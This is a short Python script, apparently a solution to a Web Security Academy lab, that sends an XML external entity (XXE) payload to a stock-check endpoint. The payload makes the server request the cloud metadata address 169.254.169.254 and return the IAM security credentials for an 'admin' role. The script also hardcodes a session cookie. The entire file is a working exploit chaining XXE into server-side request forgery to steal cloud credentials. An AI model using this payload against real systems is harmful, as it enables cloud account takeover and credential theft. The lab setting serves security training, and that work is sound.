import requests

url = "https://0a5a00fa0313a021c0105291001d0017.web-security-academy.net/product/stock"

cookies = {
	"session": "hSDkJ2j9bUHuDoUtoGorpcAp7TVB1TLA"
}

payload = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
	<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin">
]>
<stockCheck>
<productId>&xxe;</productId>
<storeId>1</storeId>
</stockCheck>"""

r = requests.post(url, data=payload, cookies=cookies)

print(r.text)